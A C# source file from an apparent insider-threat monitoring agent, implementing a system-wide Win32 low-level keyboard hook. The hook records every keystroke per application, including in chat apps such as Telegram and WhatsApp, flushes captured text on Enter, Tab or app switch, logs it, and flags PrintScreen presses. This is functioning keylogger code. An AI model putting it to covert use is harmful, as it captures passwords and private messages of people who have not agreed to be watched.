using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using InsiderThreat.MonitorAgent.Models;

namespace InsiderThreat.MonitorAgent.Services;

/// <summary>
/// Uses Win32 Low-Level Keyboard Hook to intercept keystrokes system-wide.
/// Buffers typed characters per-window and triggers keyword analysis 
/// when the buffer is flushed (on Enter, Tab, window switch, or timeout).
/// </summary>
public class KeyboardHookService : IDisposable
{
    // Win32 API imports
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

    [DllImport("user32.dll")]
    private static extern int GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll")]
    private static extern int ToUnicode(uint virtualKeyCode, uint scanCode, byte[] lpKeyState,
        [Out, MarshalAs(UnmanagedType.LPWStr, SizeConst = 64)] StringBuilder receivingBuffer,
        int bufferSize, uint flags);

    // Private fields
    private IntPtr _hookId = IntPtr.Zero;
    private LowLevelKeyboardProc? _proc;
    private readonly StringBuilder _textBuffer = new();
    private readonly ILogger<KeyboardHookService> _logger;
    private readonly TextCaptureService _textCapture;
    private DateTime _lastFlushTime = DateTime.UtcNow;
    private string _lastAppName = string.Empty;

    // Events
    public event Action<string, string, string>? OnTextBufferFlushed; // (text, windowTitle, appName)
    public event Action? OnScreenshotKeyDetected;

    public KeyboardHookService(ILogger<KeyboardHookService> logger, TextCaptureService textCapture)
    {
        _logger = logger;
        _textCapture = textCapture;
    }

    /// <summary>
    /// Start the global keyboard hook. Must be called from a thread with a message pump.
    /// </summary>
    public void Start()
    {
        _proc = HookCallback;
        using var curProcess = Process.GetCurrentProcess();
        using var curModule = curProcess.MainModule!;
        _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName!), 0);

        if (_hookId == IntPtr.Zero)
        {
            _logger.LogError("Failed to install keyboard hook. Error: {Error}", Marshal.GetLastWin32Error());
        }
        else
        {
            _logger.LogInformation("Keyboard hook installed successfully.");
        }
    }

    // List of apps where UI Automation is known to NOT work (Electron-based)
    private static readonly HashSet<string> _uiAutomationBlockedApps = new(StringComparer.OrdinalIgnoreCase)
    {
        "zalo", "telegram", "messenger", "whatsapp", "viber", "skype",
        "slack", "discord", "teams"
    };

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
        {
            int vkCode = Marshal.ReadInt32(lParam);

            // Detect PrintScreen key (VK_SNAPSHOT = 0x2C)
            if (vkCode == 0x2C)
            {
                _logger.LogWarning("PrintScreen key detected!");
                OnScreenshotKeyDetected?.Invoke();
            }

            // Detect app change and flush (compare APP NAME, not window title)
            // Zalo and other apps change window titles dynamically which causes premature flushes
            var (currentTitle, currentApp) = GetActiveWindowInfo();
            if (_lastAppName != currentApp && !string.IsNullOrEmpty(_lastAppName) && _textBuffer.Length > 0)
            {
                FlushKeyboardBuffer();
            }
            _lastAppName = currentApp;

            // Flush buffer on Enter or Tab (user finished typing a message)
            if (vkCode == 0x0D || vkCode == 0x09) // VK_RETURN or VK_TAB
            {
                FlushKeyboardBuffer();
            }
            else if (vkCode == 0x08) // VK_BACK (Backspace)
            {
                if (_textBuffer.Length > 0)
                    _textBuffer.Length--;
            }
            else
            {
                // Convert virtual key to unicode character
                var character = VirtualKeyToChar((uint)vkCode);
                if (character != null)
                {
                    _textBuffer.Append(character);
                }
            }

            // Auto-flush if buffer gets too long or enough time passed
            // Use 30 seconds and 500 chars to avoid splitting messages mid-typing
            if (_textBuffer.Length > 500 || (DateTime.UtcNow - _lastFlushTime).TotalSeconds > 30)
            {
                FlushKeyboardBuffer();
            }
        }

        return CallNextHookEx(_hookId, nCode, wParam, lParam);
    }

    /// <summary>
    /// Converts a virtual key code to its Unicode character representation.
    /// </summary>
    private string? VirtualKeyToChar(uint vkCode)
    {
        try
        {
            var keyboardState = new byte[256];
            GetKeyboardState(keyboardState);

            var sb = new StringBuilder(4);
            int result = ToUnicode(vkCode, 0, keyboardState, sb, sb.Capacity, 0);

            if (result > 0)
                return sb.ToString();
        }
        catch { /* Ignore conversion errors */ }

        return null;
    }

    /// <summary>
    /// Flush the keyboard buffer. ALWAYS uses the raw keyboard buffer as the primary source.
    /// This is the only reliable method for Electron-based apps (Zalo, Telegram, etc.)
    /// where UI Automation returns window titles instead of input text.
    /// </summary>
    private void FlushKeyboardBuffer()
    {
        _lastFlushTime = DateTime.UtcNow;
        var (windowTitle, appName) = GetActiveWindowInfo();

        if (_textBuffer.Length == 0) return;

        var bufferText = _textBuffer.ToString().Trim();
        _textBuffer.Clear();

        if (string.IsNullOrWhiteSpace(bufferText)) return;

        _logger.LogInformation("📝 Captured keystrokes [{App}]: {Text}",
            appName, bufferText.Length > 80 ? bufferText[..80] + "..." : bufferText);

        OnTextBufferFlushed?.Invoke(bufferText, windowTitle, appName);
    }

    /// <summary>
    /// Flush the text buffer and raise the OnTextBufferFlushed event with context information.
    /// </summary>
    private void FlushBuffer()
    {
        if (_textBuffer.Length == 0) return;

        var text = _textBuffer.ToString();
        _textBuffer.Clear();
        _lastFlushTime = DateTime.UtcNow;

        // Get foreground window info
        var (windowTitle, appName) = GetActiveWindowInfo();

        OnTextBufferFlushed?.Invoke(text, windowTitle, appName);
    }

    /// <summary>
    /// Gets the title and process name of the currently active (foreground) window.
    /// </summary>
    public static (string windowTitle, string appName) GetActiveWindowInfo()
    {
        var hWnd = GetForegroundWindow();

        // Get window title
        var titleBuilder = new StringBuilder(256);
        GetWindowText(hWnd, titleBuilder, 256);
        var windowTitle = titleBuilder.ToString();

        // Get process name
        string appName = "Unknown";
        try
        {
            GetWindowThreadProcessId(hWnd, out uint processId);
            using var process = Process.GetProcessById((int)processId);
            appName = process.ProcessName;
        }
        catch { /* Process may have exited */ }

        return (windowTitle, appName);
    }

    /// <summary>
    /// Forces a buffer flush (used during shutdown or periodic checks).
    /// </summary>
    public void ForceFlush() => FlushBuffer();

    public void Dispose()
    {
        if (_hookId != IntPtr.Zero)
        {
            UnhookWindowsHookEx(_hookId);
            _hookId = IntPtr.Zero;
            _logger.LogInformation("Keyboard hook uninstalled.");
        }
    }
}
